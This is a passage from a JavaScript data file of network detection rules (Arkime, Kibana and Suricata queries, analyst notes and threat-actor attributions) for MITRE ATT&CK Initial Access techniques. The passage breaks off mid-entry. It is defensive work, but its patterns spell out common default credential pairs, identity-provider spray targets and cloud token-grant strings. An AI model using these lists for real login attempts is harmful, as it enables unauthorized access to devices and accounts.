// TA0001 - Initial Access
// 9 techniques · 67 indicators · network-visible detection focus

const DATA = [
  {
    id: "T1078",
    name: "Valid Accounts",
    desc: ".001 Default · .002 Domain · .003 Local · .004 Cloud",
    rows: [
      {
        sub: "T1078.001 - Default Accounts",
        indicator: "Default credential attempt on network device / appliance management interface",
        arkime: `ip.src != $INTERNAL
&& protocols == http
&& http.method == POST
&& http.uri == [
  */login* || */auth*
  || */cgi-bin/luci*
  || */api/v1/auth*
  || */admin*
]
&& http.post-body == [
  *admin=admin*
  || *username=admin
    &password=admin*
  || *user=admin&pass=admin*
  || *username=root
    &password=root*
  || *password=1234*
  || *password=default*
  || *password=password*
]`,
        kibana: `NOT source.ip: $INTERNAL
AND http.request.method: POST
AND url.path: (
  *login* OR *auth*
  OR *cgi-bin/luci*
  OR *api/v1/auth*
  OR *admin*
)
AND http.request.body: (
  *admin=admin*
  OR *username=admin*
  OR *password=1234*
  OR *password=default*
  OR *password=password*
)`,
        suricata: `alert http $EXTERNAL_NET any
  -> $HOME_NET any
  (msg:"TA0001 T1078.001 Default
    credential attempt network
    device management";
  flow:established,to_server;
  content:"POST"; http.method;
  pcre:"/(username|user|login)=
    (admin|root|administrator)
    .{0,20}(password|pass|pwd)=
    (admin|root|1234|default|
    password|123456)/i";
  http.request_body;
  classtype:attempted-user;
  sid:9107801; rev:1;)`,
        notes: "Default credentials on network devices, IP cameras, NAS, routers, and management interfaces are trivially exploited - admin/admin, admin/password, root/root, admin/1234 cover the majority of default credential sets. Focus on management interface paths from external IPs. A 200 response with a session token or redirect to a dashboard = successful default credential login. Maintain an inventory of devices with known default credentials and change them - detection is a backstop, not the primary control.",
        apt: [
          { cls: "apt-cn", name: "Volt Typhoon", note: "Exploits default credentials on SOHO routers and network appliances to establish LOTL infrastructure within US critical infrastructure networks." },
          { cls: "apt-ru", name: "Sandworm", note: "Uses default credentials on industrial control system components and network devices in targeting of Ukrainian and European infrastructure." },
          { cls: "apt-mul", name: "Multi", note: "Default credential exploitation requires zero sophistication and is effective against a large percentage of deployed network devices." }
        ],
        cite: "MITRE ATT&CK T1078.001, CISA advisories, industry reporting"
      },
      {
        sub: "T1078.002 - Domain Accounts",
        indicator: "Kerberos authentication from external IP - domain account used outside the network perimeter",
        arkime: `ip.src != $INTERNAL
&& ip.src != $KNOWN_VPN_RANGES
&& port.dst == [88 || 464]
&& protocols == kerberos
&& databytes.src > 0
&& databytes.dst > 0`,
        kibana: `NOT source.ip: $INTERNAL
AND NOT source.ip: $KNOWN_VPN_RANGES
AND destination.port: (88 OR 464)
AND network.transport: (tcp OR udp)
AND source.bytes > 0`,
        suricata: `alert udp $EXTERNAL_NET any
  -> $HOME_NET 88
  (msg:"TA0001 T1078.002 External
    Kerberos auth domain account
    outside perimeter";
  flow:stateless;
  content:"|6a|"; depth:1;
  classtype:policy-violation;
  sid:9107802; rev:1;)`,
        notes: "Kerberos (TCP/UDP 88) should never be reachable from external IPs - it is an internal-only authentication protocol. External Kerberos connections indicate either a perimeter misconfiguration (DC exposed to internet) or an adversary with network-level access routing traffic through a compromised internal host. Content '|6a|' matches the Kerberos AS-REQ message tag. If your DC's port 88 is reachable externally this is a critical misconfiguration. Zeek kerberos.log captures all Kerberos AS-REQ and TGS-REQ details including CNameString (username) and error codes.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Uses stolen domain credentials to authenticate via Kerberos, with external Kerberos authentication visible when adversaries have established network-level access." },
          { cls: "apt-cn", name: "APT10", note: "Used domain credentials stolen from MSP environments to authenticate to customer AD environments via Kerberos." },
          { cls: "apt-mul", name: "Multi", note: "External Kerberos authentication is documented as a critical misconfiguration indicator in NSA and CISA AD security advisories." }
        ],
        cite: "MITRE ATT&CK T1078.002, NSA AD security guidance, industry reporting"
      },
      {
        sub: "T1078.002 - Domain Accounts",
        indicator: "NTLM authentication relay - NTLMv1/v2 challenge-response from unexpected external source",
        arkime: `ip.src != $INTERNAL
&& protocols == [smb || http]
&& http.request-header == [
  *NTLM *
  || *Negotiate TlRM*
]
|| smb.ntlm-auth == true
&& ip.src != $KNOWN_PARTNERS
&& port.dst == [445 || 80 || 443]`,
        kibana: `NOT source.ip: $INTERNAL
AND http.request.headers.authorization: (
  *NTLM* OR *Negotiate TlRM*
)
AND NOT source.ip: $KNOWN_PARTNERS
AND destination.port: (
  445 OR 80 OR 443
)`,
        suricata: `alert tcp $EXTERNAL_NET any
  -> $HOME_NET [80,443,445]
  (msg:"TA0001 T1078.002 NTLM auth
    from external source possible
    relay or hash use";
  flow:established,to_server;
  content:"NTLM"; http.header;
  content:"|4e 54 4c 4d 53 53 50|";
  classtype:policy-violation;
  sid:9107803; rev:1;)`,
        notes: "Content '|4e 54 4c 4d 53 53 50|' = 'NTLMSSP' - the NTLM authentication magic bytes present in every NTLM negotiate/challenge/authenticate message. External NTLM authentication to your web or SMB services indicates either a misconfigured application exposing Windows auth externally or an adversary relaying captured NTLM hashes (pass-the-hash) or performing an NTLM relay attack. NTLMv1 is catastrophically weak - challenge-response can be cracked offline. External NTLM to port 445 = critical finding.",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "Uses NTLM relay attacks to capture and relay domain credentials, documented in operations against government and military targets." },
          { cls: "apt-cn", name: "APT10", note: "Captured and replayed NTLM hashes in MSP targeting during Cloud Hopper." },
          { cls: "apt-mul", name: "Multi", note: "NTLM relay is a foundational lateral movement technique documented across virtually all nation-state and criminal actor profiles operating in Windows environments." }
        ],
        cite: "MITRE ATT&CK T1078.002, T1557.001, industry reporting"
      },
      {
        sub: "T1078.002 - Domain Accounts",
        indicator: "Password spray - low-volume auth attempts across many accounts from single external source",
        arkime: `ip.src != $INTERNAL
&& protocols == https
&& http.method == POST
&& http.host == [
  *login.microsoftonline.com*
  || *accounts.google.com*
  || *okta.com*
  || $OWA_SERVER
  || $ADFS_SERVER
]
&& http.statuscode == [
  401 || 403
]
&& ip.src groupby count > 5
  within 300s`,
        kibana: `NOT source.ip: $INTERNAL
AND http.response.status_code: (
  401 OR 403
)
AND url.domain: (
  *login.microsoftonline.com*
  OR *accounts.google.com*
  OR *okta.com*
)
AND source.bytes > 0`,
        suricata: `alert http $EXTERNAL_NET any
  -> $HOME_NET any
  (msg:"TA0001 T1078.002 Password
    spray auth failures IdP
    endpoint";
  flow:established,to_server;
  content:"POST"; http.method;
  pcre:"/(login\\.microsoftonline|
    accounts\\.google|
    okta\\.com)/i";
  http.header;
  content:"40"; http.stat_code;
  threshold:type both,
    track by_src,
    count 5, seconds 300;
  classtype:attempted-user;
  sid:9107804; rev:1;)`,
        notes: "Password spraying uses a single password against many accounts to avoid lockout - distinguishable from brute force by low per-account attempt count (1-3) and high unique account count. Network-visible signal: many HTTP 401/403 responses from the same source IP against an IdP endpoint within a time window. Detection threshold must be tuned to your environment's legitimate failed auth rate. Distributed sprays use many source IPs with low per-source rate - aggregate by user agent or ASN. Watch for Microsoft's UserRealmDiscovery requests (GetCredentialType) which adversaries use to identify valid accounts before spraying.",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "Conducts large-scale password spraying against Office 365 and on-premises Exchange infrastructure targeting government, defense, and think tank organizations per NSA/CISA AA20-296A." },
          { cls: "apt-ru", name: "Midnight Blizzard", note: "Uses password spraying against Microsoft 365 tenants as a precursor to targeted access." },
          { cls: "apt-ir", name: "APT33", note: "Password sprays against energy sector Office 365 tenants and OWA infrastructure." }
        ],
        cite: "MITRE ATT&CK T1078.002, T1110.003, NSA/CISA AA20-296A"
      },
      {
        sub: "T1078.003 - Local Accounts",
        indicator: "Local admin credential use over SMB from external / unexpected source",
        arkime: `ip.src != $INTERNAL
&& port.dst == 445
&& protocols == smb
&& smb.user == [
  *administrator*
  || *admin*
  || *localadmin*
  || *sysadmin*
]
&& databytes.src > 0
&& databytes.dst > 0`,
        kibana: `NOT source.ip: $INTERNAL
AND destination.port: 445
AND network.transport: tcp
AND smb.user: (
  *administrator*
  OR *admin*
  OR *localadmin*
)
AND source.bytes > 0
AND destination.bytes > 0`,
        suricata: `alert tcp $EXTERNAL_NET any
  -> $HOME_NET 445
  (msg:"TA0001 T1078.003 SMB local
    admin auth from external
    source";
  flow:established,to_server;
  content:"|ff 53 4d 42|"; depth:5;
  classtype:policy-violation;
  sid:9107805; rev:1;)`,
        notes: "Local administrator accounts used over SMB from external IPs indicate either a perimeter misconfiguration (SMB internet-exposed - critical) or an adversary who has obtained local credentials and is authenticating remotely. External TCP/445 should never reach internal hosts - any successful SMB session from external IPs is a P0 finding. Internally, lateral movement using local admin accounts over SMB is covered in TA0008. Zeek smb.log captures username, domain, and auth success/failure.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Uses local administrator credentials over SMB for lateral movement and remote access in financial sector targeting." },
          { cls: "apt-ru", name: "Sandworm", note: "Uses local admin credential access over SMB in destructive operations against Ukrainian infrastructure." },
          { cls: "apt-mul", name: "Multi", note: "Local admin SMB access is a primary lateral movement technique in ransomware operations and is documented in FBI and CISA ransomware advisories." }
        ],
        cite: "MITRE ATT&CK T1078.003, T1021.002, CISA advisories"
      },
      {
        sub: "T1078.004 - Cloud Accounts",
        indicator: "Cloud service account / API key use from unexpected IP - stolen key or token abuse",
        arkime: `ip.src != $INTERNAL
&& ip.src != $KNOWN_CI_CD_IPS
&& protocols == https
&& http.host == [
  *sts.amazonaws.com*
  || *oauth2.googleapis.com*
  || *login.microsoftonline.com*
  || *iam.amazonaws.com*
]
&& http.method == POST
&& http.post-body == [
  *grant_type=client_credentials*
  || *grant_type=urn:ietf:params*
  || *Action=AssumeRole*
  || *Action=GetSessionToken*
]
&& ip.src != $KNOWN_GOOD`,
        kibana: `NOT source.ip: $INTERNAL
AND NOT source.ip: $KNOWN_CI_CD_IPS
AND http.request.method: POST
AND url.domain: (
  *sts.amazonaws.com*
  OR *oauth2.googleapis.com*
  OR *login.microsoftonline.com*
  OR *iam.amazonaws.com*
)
AND http.request.body: (
  *client_credentials*
  OR *AssumeRole*
  OR *GetSessionToken*
)`,
        suricata: `alert http $EXTERNAL_NET any
  -> $EXTERNAL_NET 443
  (msg:"TA0001 T1078.004 Cloud
    service account auth from
    unexpected IP stolen key";
  flow:established,to_server;
  content:"POST"; http.method;
  pcre:"/(sts\\.amazonaws\\.com|
    oauth2\\.googleapis\\.com|
    login\\.microsoftonline\\.com|
    iam\\.amazonaws\\.com)/i";
  http.header;
  pcre:"/(grant_type=
    client_credentials|
    AssumeRole|
    GetSessionToken)/i";
  http.request_body;
  classtype:policy-violation;
  sid:9107806; rev:1;)`,
        notes: "Cloud service accounts and API keys are long-lived credentials that don't require MFA - a stolen key works indefinitely until rotated. AWS STS AssumeRole and GetSessionToken from unexpected IPs indicate stolen IAM credentials. OAuth2 client_credentials grant from unknown IPs indicates stolen service account credentials. Requires egress SSL inspection to see request bodies against cloud STS endpoints. Correlate with your cloud provider's audit logs (CloudTrail, Azure Activity, GCP Audit) - network layer detection catches the authentication attempt; cloud audit logs tell you what the account did afterward.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Uses stolen OAuth tokens and service account credentials to access cloud environments, documented in CISA and NSA advisories on APT29 cloud targeting." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Steals cloud API keys and service account credentials via social engineering then accesses cloud environments from adversary-controlled IPs." },
          { cls: "apt-cn", name: "APT41", note: "Uses stolen cloud service account credentials in targeted intrusion campaigns against technology sector cloud infrastructure." }
        ],
        cite: "MITRE ATT&CK T1078.004, T1552.001, CISA cloud security advisories"
      },
      {
        sub: "T1078.004 - Cloud Accounts",
        indicator: "Federated identity token abuse - SAML golden ticket or OAuth token from anomalous issuer",
        arkime: `ip.src != $INTERNAL
&& protocols == https
&& http.method == POST
&& http.post-body == [
  *SAMLResponse=*
  || *grant_type=
    urn:ietf:params:oauth:
    grant-type:saml2-bearer*
]
&& http.host != $KNOWN_IDPS
&& databytes.src > 500`,
        kibana: `NOT source.ip: $INTERNAL
AND http.request.method: POST
AND http.request.body:
  *SAMLResponse=*
AND NOT url.domain: $KNOWN_IDPS
AND source.bytes > 500`,
        suricata: `alert http $EXTERNAL_NET any
  -> $EXTERNAL_NET 443
  (msg:"TA0001 T1078.004 SAML
    response from unexpected
    issuer golden ticket abuse";
  flow:established,to_server;
  content:"POST"; http.method;
  content:"SAMLResponse=";
  http.request_body;
  classtype:policy-violation;
  sid:9107807; rev:1;)`,
        notes: "SAML golden ticket attacks (Solorigate/SolarWinds TTPs) forge SAML tokens using a compromised ADFS token signing certificate - the forged token is accepted by cloud services (Azure AD, AWS) as legitimate. Network signal: SAMLResponse POST from an unexpected host or to a cloud service that should be receiving SAML assertions from your ADFS/IdP. Compare the SAMLResponse Issuer field against your known IdP entity IDs. Also watch for OAuth token grant requests using the SAML bearer assertion grant type from unexpected IPs.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Used forged SAML tokens via compromised ADFS token signing certificates in the SolarWinds/Solorigate campaign to access Microsoft 365 and Azure AD tenants of thousands of organizations." },
          { cls: "apt-mul", name: "Multi", note: "SAML golden ticket abuse is documented in CISA Emergency Directive 21-01 and Microsoft MSTIC reporting on the SolarWinds campaign." }
        ],
        cite: "MITRE ATT&CK T1078.004, T1606.002, CISA ED-21-01, Microsoft MSTIC"
      }
    ]
  },
  {
    id: "T1091",
    name: "Replication Through Removable Media",
    desc: "USB / external storage propagation - air-gap bridging and post-execution C2",
    rows: [
      {
        sub: "T1091 - Post-USB Execution",
        indicator: "New outbound beacon from host within 5 minutes of USB device insertion event",
        arkime: `ip.src == $INTERNAL
&& ip.dst != $KNOWN_GOOD
&& port.dst == [
  443 || 80 || 8080
  || 53 || 4444
]
&& packets.src > 5
&& packets.src < 50
&& session.duration > 60
&& starttime - usb_event.time
  < 300s`,
        kibana: `source.ip: $INTERNAL
AND NOT destination.ip: $KNOWN_GOOD
AND destination.port: (
  443 OR 80 OR 8080
  OR 53 OR 4444
)
AND network.packets: [5 TO 50]
AND event.duration > 60000000`,
        suricata: `alert tcp $HOME_NET any
  -> $EXTERNAL_NET
  [80,443,8080,4444]
  (msg:"TA0001 T1091 New outbound
    beacon possible USB payload
    activation";
  flow:established,to_server;
  threshold:type both,
    track by_src,
    count 1, seconds 300;
  classtype:trojan-activity;
  sid:9109101; rev:1;)`,
        notes: "Detection requires correlation between Windows Event 6416 (USB device insertion), Sysmon Event 9 (RawAccessRead on USB), or EDR USB telemetry and subsequent first-seen outbound network connections. The window is short - most USB-borne payloads beacon within seconds of execution. Build per-host network baselines: any new outbound destination IP appearing within 5 minutes of a USB event from a host that previously didn't communicate with that destination is a strong signal. Air-gapped or OT networks: any outbound from a host that just had a USB inserted is itself anomalous regardless of destination.",
        apt: [
          { cls: "apt-ru", name: "Sandworm", note: "Has used USB-based propagation in operations targeting Ukrainian critical infrastructure, including OT and ICS environments where USB is often the only ingress vector." },
          { cls: "apt-cn", name: "Mustang Panda", note: "Extensively uses USB-based propagation (PlugX variant) targeting government and NGO sectors across Asia-Pacific, with infected USBs delivering payloads that immediately establish C2 beacons." },
          { cls: "apt-mul", name: "Multi", note: "USB-based propagation is documented in CISA advisories on critical infrastructure protection and ICS security as a primary air-gap-bridging technique." }
        ],
        cite: "MITRE ATT&CK T1091, CISA advisories, industry reporting"
      },
      {
        sub: "T1091 - Worm Propagation",
        indicator: "Burst of outbound SMB connections from single host - Stuxnet-class worm propagation",
        arkime: `ip.src == $INTERNAL
&& port.dst == 445
&& protocols == smb
&& ip.dst == $INTERNAL
&& packets.src > 0
&& session-count groupby ip.src
  > 10 within 60s`,
        kibana: `source.ip: $INTERNAL
AND destination.ip: $INTERNAL
AND destination.port: 445
AND network.transport: tcp
AND _exists_: smb.command`,
        suricata: `alert tcp $HOME_NET any
  -> $HOME_NET 445
  (msg:"TA0001 T1091 SMB connection
    burst possible USB-borne worm
    propagation";
  flow:established,to_server;
  content:"|ff 53 4d 42|"; depth:5;
  threshold:type both,
    track by_src,
    count 10, seconds 60;
  classtype:trojan-activity;
  sid:9109102; rev:1;)`,
        notes: "USB-borne worms (Stuxnet, Conficker, USB Thief, Raspberry Robin) propagate by enumerating network shares and copying themselves. Network signal: a single internal host suddenly initiating SMB connections to many other internal hosts in rapid succession. Workstations don't normally connect to other workstations via SMB - endpoint-to-endpoint SMB is highly suspicious. Servers receiving connections from many workstations is normal; one workstation connecting to many others is not. Threshold: 10 SMB connections in 60 seconds from a single source is conservative - Stuxnet/Conficker generated dozens per minute.",
        apt: [
          { cls: "apt-mul", name: "Stuxnet", note: "Used USB-based propagation followed by SMB-based lateral movement targeting Siemens industrial systems." },
          { cls: "apt-ru", name: "Sandworm", note: "Used USB-borne payloads with SMB propagation in operations against Ukrainian infrastructure." },
          { cls: "apt-mul", name: "Conficker", note: "Demonstrated the network signal at scale - millions of hosts generating SMB propagation patterns." }
        ],
        cite: "MITRE ATT&CK T1091, T1021.002, CISA ICS-CERT"
      },
      {
        sub: "T1091 - Worm Propagation",
        indicator: "SMB write to ADMIN$ / C$ share from non-admin host - payload drop via removable media propagation",
        arkime: `ip.src == $USER_VLAN
&& port.dst == 445
&& protocols == smb
&& smb.share == [
  *ADMIN$* || *C$*
  || *IPC$*
]
&& smb.command == [
  WRITE || CREATE
]
&& ip.dst == $INTERNAL`,
        kibana: `source.ip: $USER_VLAN
AND destination.ip: $INTERNAL
AND destination.port: 445
AND smb.share: (
  *ADMIN$* OR *C$* OR *IPC$*
)
AND smb.command: ("WRITE" OR "CREATE")`,
        suricata: `alert tcp $USER_VLAN any
  -> $HOME_NET 445
  (msg:"TA0001 T1091 SMB write to
    admin share from user VLAN
    possible worm";
  flow:established,to_server;
  content:"|ff 53 4d 42|"; depth:5;
  content:"ADMIN$"; nocase;
  classtype:trojan-activity;
  sid:9109103; rev:1;)`,
        notes: "USB-borne worms drop their payload to administrative shares (ADMIN$ = C:\\Windows on remote host, C$ = C:\\, IPC$ = inter-process communication) on neighboring systems. End-user workstations should never write to ADMIN$ or C$ on other workstations - this is admin tooling territory only. Detection: any SMB CREATE or WRITE operation targeting ADMIN$/C$ from a user VLAN source. Legitimate use cases (Group Policy, SCCM, RMM tools) come from known admin server VLANs, not user workstations.",
        apt: [
          { cls: "apt-mul", name: "Stuxnet", note: "Wrote payloads to ADMIN$ shares on neighboring Windows systems as its primary lateral propagation method following USB initial access." },
          { cls: "apt-mul", name: "Raspberry Robin", note: "Criminal worm with documented use by EvilCorp/Indrik Spider that propagates via USB and uses SMB-based lateral movement to ADMIN$ shares." },
          { cls: "apt-ru", name: "Sandworm", note: "Has used SMB-based payload drops following USB ingress in operations against Ukrainian infrastructure." }
        ],
        cite: "MITRE ATT&CK T1091, T1021.002, NSA AD security"
      },
      {
        sub: "T1091 - Air-Gap Bridging",
        indicator: "Network traffic from previously air-gapped / segmented host - USB-borne network bridge",
        arkime: `ip.src == $AIR_GAPPED_VLAN
&& protocols != [
  arp || dhcp || ntp
]
&& ip.dst != $AIR_GAPPED_VLAN
&& databytes.src > 0`,
        kibana: `source.ip: $AIR_GAPPED_VLAN
AND NOT destination.ip: $AIR_GAPPED_VLAN
AND NOT network.protocol: (
  arp OR dhcp OR ntp
)
AND source.bytes > 0`,
        suricata: `alert ip $AIR_GAPPED_VLAN any
  -> !$AIR_GAPPED_VLAN any
  (msg:"TA0001 T1091 Traffic from
    air-gapped VLAN possible USB
    bridging";
  classtype:policy-violation;
  sid:9109104; rev:1;)`,
        notes: "In environments with air-gapped or strictly segmented VLANs (OT/ICS, classified networks, financial trading floors), any unexpected outbound traffic is a critical indicator. USB-borne malware can bridge air gaps either by configuring the infected host as a routing hop, exfiltrating data via the next time a USB is used to physically move data, or by abusing covert channels. Detection: define the expected traffic profile for your air-gapped segments (typically just ARP, DHCP, and NTP within the segment) and alert on anything else. Pair with USB device insertion events on hosts in those segments.",
        apt: [
          { cls: "apt-mul", name: "Stuxnet", note: "Specifically designed to bridge the air gap to Iranian uranium enrichment networks via USB media - the original air-gap bridging case study." },
          { cls: "apt-ru", name: "Turla", note: "Has used USB-based techniques to deliver payloads into segmented diplomatic networks." },
          { cls: "apt-ru", name: "Sandworm", note: "Has bridged segmented Ukrainian government and critical infrastructure networks via USB ingress." }
        ],
        cite: "MITRE ATT&CK T1091, CISA ICS-CERT, industry reporting"
      },
      {
        sub: "T1091 - Stage-Two Payload",
        indicator: "Internal host fetching second-stage payload after autorun-pattern execution - LNK / autorun.inf signal",
        arkime: `ip.src == $INTERNAL
&& protocols == http
&& http.method == GET
&& http.uri == [
  *.bin || *.dat
  || *.exe || *.dll
  || *.ps1 || *.scr
]
&& ip.dst != $KNOWN_GOOD
&& dns.host-age < 30d
&& starttime - usb_event.time
  < 60s`,
        kibana: `source.ip: $INTERNAL
AND http.request.method: GET
AND url.path: (
  *.bin OR *.dat
  OR *.exe OR *.dll
  OR *.ps1 OR *.scr
)
AND NOT destination.ip: $KNOWN_GOOD`,
        suricata: `alert http $HOME_NET any
  -> $EXTERNAL_NET any
  (msg:"TA0001 T1091 Second-stage
    payload fetch post USB possible
    autorun activation";
  flow:established,to_server;
  content:"GET"; http.method;
  pcre:"/\\.(bin|dat|exe|dll|
    ps1|scr|ico)\\b/i";
  http.uri;
  classtype:trojan-activity;
  sid:9109105; rev:1;)`,
        notes: "Modern USB-borne malware often uses LNK files or registered file handlers (autorun.inf is largely deprecated but still abused on legacy systems) that execute a small first-stage downloader. The downloader fetches the actual payload from an external server. Network signal: HTTP GET for an executable, DLL, PowerShell script, or generic binary file from an unfamiliar host within 60 seconds of a USB device event. Raspberry Robin specifically uses .lnk files on USBs that fetch payloads from compromised QNAP devices. User-Agent often reveals the downloader: WinHTTP, BITS/7.5, PowerShell, certutil - these from a workstation right after USB insertion are highly suspicious.",
        apt: [
          { cls: "apt-mul", name: "Raspberry Robin", note: "Uses USB-based .lnk file infection followed by HTTP downloads of second-stage payloads - associated with EvilCorp/Indrik Spider and used as a precursor to ransomware deployment." },
          { cls: "apt-cn", name: "Mustang Panda", note: "Uses USB-based LNK propagation followed by HTTP stage-two downloads in operations against government and NGO sectors." },
          { cls: "apt-mul", name: "Multi", note: "The pattern of LNK execution followed by HTTP payload fetch is documented in CISA advisories and Microsoft Threat Intelligence reporting." }
        ],
        cite: "MITRE ATT&CK T1091, T1204.002, CISA advisories, Microsoft MSTIC"
      }
    ]
  },
  {
    id: "T1133",
    name: "External Remote Services",
    desc: "VPN · RDP · SSH · Citrix · Cloud management - credential abuse and brute force",
    rows: [
      {
        sub: "T1133 - VPN Anomalies",
        indicator: "VPN authentication from unexpected geolocation - impossible travel or first-seen country",
        arkime: `ip.dst == $VPN_SERVERS
&& protocols == [
  ssl || tls || udp
]
&& port.dst == [
  443 || 4433 || 8443
  || 500 || 4500
  || 1194 || 1723
]
&& ip.src != $KNOWN_VPN_GEOS
&& databytes.src > 0
&& databytes.dst > 0`,
        kibana: `destination.ip: $VPN_SERVERS
AND destination.port: (
  443 OR 4433 OR 8443
  OR 500 OR 4500
  OR 1194 OR 1723
)
AND NOT source.geo.country_iso_code:
  $ALLOWED_COUNTRIES
AND source.bytes > 0`,
        suricata: `alert tcp $EXTERNAL_NET any
  -> $HOME_NET
  [443,4433,8443,1194,1723]
  (msg:"TA0001 T1133 VPN auth
    from unexpected geo
    possible stolen cred";
  flow:established,to_server;
  content:"|16 03|"; depth:2;
  threshold:type both,
    track by_dst,
    count 3, seconds 60;
  classtype:policy-violation;
  sid:9113301; rev:1;)`,
        notes: "Geolocation-based VPN anomaly detection is most effective when combined with user baseline data - a user who always authenticates from the US suddenly connecting from Eastern Europe or Southeast Asia is high-confidence. Impossible travel: same account authenticating from two geographically distant locations within a timeframe physically impossible for travel (e.g., US and Russia within 2 hours). First-seen country: account authenticating from a country it has never previously used. IKEv2 uses UDP/500 and UDP/4500; SSL VPN uses TCP/443 or TCP/4433; OpenVPN uses UDP or TCP/1194; PPTP uses TCP/1723.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Uses stolen credentials to authenticate to VPN services from adversary-controlled infrastructure, generating impossible travel indicators when the compromised account is also legitimately active." },
          { cls: "apt-cn", name: "APT10", note: "Used stolen VPN credentials to access MSP customer networks during Cloud Hopper, authenticating from unexpected geolocations." },
          { cls: "apt-ir", name: "APT33", note: "Uses stolen credentials to access energy sector VPN infrastructure from Iranian IP ranges." }
        ],
        cite: "MITRE ATT&CK T1133, T1078, CISA advisories"
      },
      {
        sub: "T1133 - VPN Anomalies",
        indicator: "VPN authentication outside business hours from new source IP - off-hours credential use",
        arkime: `ip.dst == $VPN_SERVERS
&& protocols == tls
&& port.dst == [
  443 || 4433 || 8443
]
&& ip.src != $KNOWN_VPN_IPS
&& hour > 22 || hour < 6
&& databytes.src > 1000
&& databytes.dst > 1000`,
        kibana: `destination.ip: $VPN_SERVERS
AND destination.port: (
  443 OR 4433 OR 8443
)
AND NOT source.ip: $KNOWN_VPN_IPS
AND @timestamp: {
  "hour_of_day": [22 TO 6]
}
AND source.bytes > 1000`,
        suricata: `alert tcp $EXTERNAL_NET any
  -> $HOME_NET [443,4433,8443]
  (msg:"TA0001 T1133 VPN auth
    off-hours new source IP";
  flow:established,to_server;
  content:"|16 03|"; depth:2;
  content:"|01|"; offset:5;
  depth:1;
  threshold:type both,
    track by_src,
    count 1, seconds 300;
  classtype:policy-violation;
  sid:9113302; rev:1;)`,
        notes: "Off-hours VPN connections from new source IPs combine two anomaly signals into a higher-confidence indicator. Adversaries authenticating with stolen credentials often do so outside business hours to reduce detection risk and analyst response time. Content '|16 03|' = TLS record header, '|01|' at offset 5 = ClientHello - identifies an active TLS handshake initiation. Build a per-account VPN source IP baseline - the first connection from a new IP address during off-hours (22:00-06:00 local) warrants investigation regardless of successful authentication.",
        apt: [
          { cls: "apt-ru", name: "Midnight Blizzard", note: "Conducts VPN and remote access operations outside target organization business hours to minimize detection response, documented in Microsoft and CISA advisories." },
          { cls: "apt-kp", name: "Lazarus", note: "Uses off-hours remote access to avoid analyst attention during initial access and lateral movement phases." },
          { cls: "apt-mul", name: "Multi", note: "Off-hours remote access from new source IPs is documented as a high-confidence behavioral indicator in CISA and FBI joint advisories on credential-based intrusions." }
        ],
        cite: "MITRE ATT&CK T1133, T1078, CISA advisories"
      },
      {
        sub: "T1133 - RDP Exposure",
        indicator: "External RDP connection - internet-facing RDP from non-whitelisted IP",
        arkime: `ip.src != $INTERNAL
&& ip.src != $ALLOWED_RDP_IPS
&& port.dst == 3389
&& protocols == rdp
&& databytes.src > 0
&& databytes.dst > 0`,
        kibana: `NOT source.ip: $INTERNAL
AND NOT source.ip: $ALLOWED_RDP_IPS
AND destination.port: 3389
AND network.transport: tcp
AND source.bytes > 0
AND destination.bytes > 0`,
        suricata: `alert tcp $EXTERNAL_NET any
  -> $HOME_NET 3389
  (msg:"TA0001 T1133 External RDP
    connection non-whitelisted
    source";
  flow:established,to_server;
  content:"|03 00|"; depth:2;
  content:"|e0|"; offset:5;
  depth:1;
  classtype:attempted-recon;
  sid:9113303; rev:1;)`,
        notes: "Internet-facing RDP (TCP/3389) is one of the most commonly exploited initial access vectors - it should never be directly exposed to the internet. If it is, any successful connection from a non-whitelisted IP is an immediate incident. Content '|03 00|' = TPKT header, '|e0|' at offset 5 = Connection Request TPDU - identifies an active RDP session initiation (not just a port scan). Distinguish between connection attempts (few packets, no authentication) and successful sessions (sustained bidirectional traffic, large databytes.dst).",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "Uses exposed RDP as an initial access vector against government and military targets." },
          { cls: "apt-kp", name: "Lazarus", note: "Exploits internet-facing RDP in financial sector targeting." },
          { cls: "apt-mul", name: "Ransomware", note: "Exposed RDP is the primary initial access vector for the majority of ransomware operations - the single most common ransomware entry point per FBI and CISA advisories." }
        ],
        cite: "MITRE ATT&CK T1133, FBI ransomware advisories, CISA advisories"
      },
      {
        sub: "T1133 - RDP Exposure",
        indicator: "RDP credential spray - high-volume authentication attempts from single external source",
        arkime: `ip.src != $INTERNAL
&& port.dst == 3389
&& protocols == rdp
&& packets.src > 5
&& packets.dst > 5
&& databytes.dst < 5000
&& ip.src groupby count > 10
  within 60s`,
        kibana: `NOT source.ip: $INTERNAL
AND destination.port: 3389
AND network.transport: tcp
AND network.packets > 5`,
        suricata: `alert tcp $EXTERNAL_NET any
  -> $HOME_NET 3389
  (msg:"TA0001 T1133 RDP credential
    spray high volume auth
    attempts";
  flow:established,to_server;
  content:"|03 00|"; depth:2;
  threshold:type both,
    track by_src,
    count 10, seconds 60;
  classtype:attempted-user;
  sid:9113304; rev:1;)`,
        notes: "RDP credential spraying tools (Hydra, Medusa, NLBrute, RDPBrute) generate high-volume authentication attempts visible as rapid successive TCP/3389 connections. Each attempt: TCP connect, TPKT/RDP handshake, NLA authentication exchange, disconnect - generating a distinctive connection pattern of many short sessions from the same source. Low databytes.dst confirms no successful session data was transferred. Distributed sprays use many source IPs - look for the same username being attempted across many sources.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Conducts RDP credential spraying against financial sector targets as a precursor to initial access." },
          { cls: "apt-ru", name: "APT28", note: "Uses automated RDP credential spraying against government and military targets." },
          { cls: "apt-mul", name: "IAB", note: "Initial access brokers routinely spray RDP credentials at scale to build access inventories for ransomware operators." }
        ],
        cite: "MITRE ATT&CK T1133, T1110.003, FBI ransomware advisories"
      },
      {
        sub: "T1133 - SSH Brute Force",
        indicator: "SSH brute force - rapid successive authentication failures from external source",
        arkime: `ip.src != $INTERNAL
&& port.dst == 22
&& protocols == ssh
&& packets.src > 3
&& packets.dst > 3
&& databytes.dst < 3000
&& ip.src groupby count > 5
  within 30s`,
        kibana: `NOT source.ip: $INTERNAL
AND destination.port: 22
AND network.transport: tcp
AND network.packets: [3 TO 20]
AND destination.bytes: [0 TO 3000]`,
